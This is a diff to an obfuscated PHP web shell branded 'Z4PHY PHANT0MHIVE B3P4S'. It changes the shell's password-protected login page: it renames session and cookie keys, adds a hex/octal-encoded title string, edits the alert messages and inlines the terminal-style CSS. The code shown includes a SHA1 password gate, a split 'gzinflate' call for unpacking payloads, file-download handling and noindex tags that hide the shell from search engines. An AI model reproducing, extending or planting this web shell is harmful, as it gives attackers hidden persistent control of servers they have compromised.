@@ -39,7 +39,8 @@ if (isset($_GET['downloadfile'])) {
     }
 }
 //Config Shell
-$s_he_ll_Title = "\044\040\056\072\040\132\064\120\110\131\040\120\110\101\116\124\060\115\110\111\126\105\040\102\063\120\064\123\072\056\040\044";
+$s_he_ll_Login = "\044\040\056\072\132\064\120\110\131\040\120\110\101\116\124\060\115\110\111\126\105\040\102\063\120\064\123\040\114\117\107\111\116\072\056\040\044";
+$s_he_ll_Title = "\044\040\056\072\040\132\064\120\110\131\040\120\110\101\116\124\060\115\110\111\126\105\040\102\063\120\064\123\040\072\056\040\044";
 $s_he_ll_Name = "\132\064\120\110\131\040\120\110\064\116\124\060\115\110\111\126\105\040\102\063\120\064\123";
 $s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x6d\x61\x69\x6e\x2f\x7a\x34\x70\x2d\x62\x33\x70\x34\x73\x2f\x61\x73\x73\x65\x74\x2f\x63\x69\x65\x6c\x2e\x70\x6e\x67";
 $s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x6d\x61\x69\x6e\x2f\x7a\x34\x70\x2d\x62\x33\x70\x34\x73\x2f\x61\x73\x73\x65\x74\x2f\x69\x63\x6f\x6e\x73\x2e\x6a\x70\x67";
@@ -446,10 +447,10 @@ $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOS
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $goz4p) {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Me"."ny"."al"."a "."Ab"."an"."gk"."u "."~!'".");"."</"."sc"."ri"."pt".">";
-        $_SESSION["z4phyc0de"] = "z4phyc0de";
-        setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
+        $_SESSION["Z4PHY"] = "Z4PHY";
+        setcookie('Z4PHY', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"." !"."!')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"." !!"." -"." Z"."4P"."HY"." H"."ER"."E')".";<"."/s"."cr"."ip"."t>";
     }
     function eNp($ZkzOl){
         $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
@@ -468,32 +469,304 @@ if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
-    setcookie('z4phyc0de', '', time() - 3600);
+    setcookie('Z4PHY', '', time() - 3600);
     echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
     exit();
 }
 
-if (empty($_SESSION['z4phyc0de'])) {
-    if (empty($_COOKIE['z4phyc0de'])) {
+if (empty($_SESSION['Z4PHY'])) {
+    if (empty($_COOKIE['Z4PHY'])) {
         ?>
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <title>
-        .:<?= $s_he_ll_Title ?> LOGIN:.
+        .:<?= $s_he_ll_Title
+         ?>:.
     </title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <meta name="description" content=".:<?= $s_he_ll_Name ?> LOGIN:." />
+    <meta name="description" content=".:<?= $s_he_ll_Login ?>:." />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
     <link href="<?= $s_he_ll_Icon ?>" rel="shortcut icon" type="image/x-icon">
     <link rel="apple-touch-icon" href="<?= $s_he_ll_Icon ?>"/>
     <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/css/custome-z4p.css">
+    <style>
+    @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background-image: url('https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/background.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
+        background-position: center;
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+    }
+
+    .terminal {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%);
+        font-family: "Noto Sans Mono", monospace;
+        width: 400px;
+        height: 250px;
+        background: rgba(36, 38, 46, 1);
+        border: 1px solid #eaeaea;
+        animation: fadein 7s;
+    }
+
+    @keyframes fadein {
+        from {
+            filter: brightness(0%);
+        }
+
+        to {
+            filter: brightness(100%);
+        }
+    }
+
+    .terminal .root {
+        position: absolute;
+        padding: 5px;
+        font-size: 10px;
+        font-weight: 600;
+        color: #f00;
+    }
+
+    .terminal #app {
+        position: absolute;
+        top: 11.9%;
+        left: 9%;
+        font-size: 10px;
+        color: #00ff00;
+        padding: 5px;
+    }
+
+    .terminal .goz4p {
+        position: absolute;
+        top: 20%;
+        left: 2%;
+        font-family: monospace;
+        font-size: 10px;
+        color: #00ff00;
+    }
+
+    .terminal .goz4p input[type=text] {
+        background: transparent;
+        border: none;
+        outline: none;
+        font-family: monospace;
+        font-size: 10px;
+        color: #00ff00;
+    }
+
+    .terminal .goz4p input[type=text]:hover {
+        border: none;
+        outline: none;
+    }
+
+    .headerTerm {
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        width: 399px;
+        height: 15px;
+        background: #eaeaea;
+    }
+
+    .headerTerm img {
+        width: 15px;
+        height: 15px;
+        padding-bottom: 3.5px;
+        padding-left: 3px;
+    }
+
+    .headerTerm span {
+        position: absolute;
+        left: 4%;
+        font-family: Monospace;
+        font-size: 10px;
+        font-weight: 500;
+    }
+
+    .headerTerm strong {
+        position: absolute;
+        left: 50%;
+        transform: translate(-50%);
+        font-family: Monospace;
+        font-size: 10px;
+        font-weight: 500;
+    }
+
+    @media screen and (min-width: 720px) {
+        .terminal {
+            width: 600px;
+            height: 350px;
+        }
+
+        .terminal .root {
+            font-size: 15px;
+        }
+
+        .terminal #app {
+            font-size: 15px;
+        }
+
+        .terminal .goz4p {
+            font-size: 15px;
+        }
+
+        .terminal .goz4p input[type=text] {
+            font-size: 15px;
+        }
+
+        .headerTerm {
+            width: 599px;
+            height: 20px;
+        }
+
+        .headerTerm img {
+            width: 20px;
+            height: 20px;
+            padding-top: 2px;
+        }
+
+        .headerTerm span {
+            font-size: 13px;
+        }
+
+        .headerTerm strong {
+            font-size: 13px;
+        }
+    }
+
+    @media screen and (min-width: 900px) {
+        .terminal {
+            width: 800px;
+            height: 450px;
+        }
+
+        .terminal .root {
+            font-size: 20px;
+        }
+
+        .terminal #app {
+            font-size: 20px;
+        }
+
+        .terminal .goz4p {
+            font-size: 20px;
+        }
+
+        .terminal .goz4p input[type=text] {
+            font-size: 20px;
+        }
+
+        .headerTerm {
+            width: 799px;
+            height: 25px;
+        }
+
+        .headerTerm img {
+            width: 25px;
+            height: 25px;
+            padding-top: 2.5px;
+        }
+
+        .headerTerm span {
+            font-size: 18px;
+        }
+
+        .headerTerm strong {
+            font-size: 18px;
+        }
+    }
+
+    @media screen and (max-width: 500px) {
+        .terminal {
+            width: 280px;
+            height: 150px;
+        }
+
+        .terminal .root {
+            font-size: 6.5px;
+            padding: 2px;
+        }
+
+        .terminal #app {
+            font-size: 6.5px;
+            padding: 2px;
+        }
+
+        .terminal .goz4p {
+            position: absolute;
+            top: 20%;
+            left: 2%;
+            font-family: monospace;
+            font-size: 10px;
+            color: #00ff00;
+        }
+
+        .terminal .goz4p input[type=text] {
+            background: transparent;
+            border: none;
+            outline: none;
+            font-family: monospace;
+            font-size: 10px;
+            color: #00ff00;
+        }
+
+        .terminal .goz4p input[type=text]:hover {
+            background: transparent;
+            border: none;
+            outline: none;
+        }
+
+        .terminal .goz4p input[type=text]:active {
+            background: transparent;
+            border: none;
+            outline: none;
+        }
+
+        .terminal .goz4p input[type=text]:focus {
+            background: transparent;
+            border: none;
+            outline: none;
+        }
+
+        .headerTerm {
+            width: 279px;
+            height: 8.5px;
+        }
+
+        .headerTerm img {
+            width: 8.5px;
+            height: 8.5px;
+            padding: 1.5px;
+            position: absolute;
+        }
+
+        .headerTerm span {
+            font-size: 6px;
+            left: 4%;
+        }
+
+        .headerTerm strong {
+            font-size: 6px;
+            right: 4%;
+        }
+    }
+    </style>
 </head>
 
 <body>
@@ -502,7 +775,7 @@ if (empty($_SESSION['z4phyc0de'])) {
             <img src="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/terminal.png"
                 alt="terminal" /><span>Terminal</span>
             <strong>
-                <?= $s_he_ll_Title ?> LOGIN
+                <?= $s_he_ll_Login ?>
             </strong>
         </div>
         <div class="root" style="color: #d00c0c"></div>
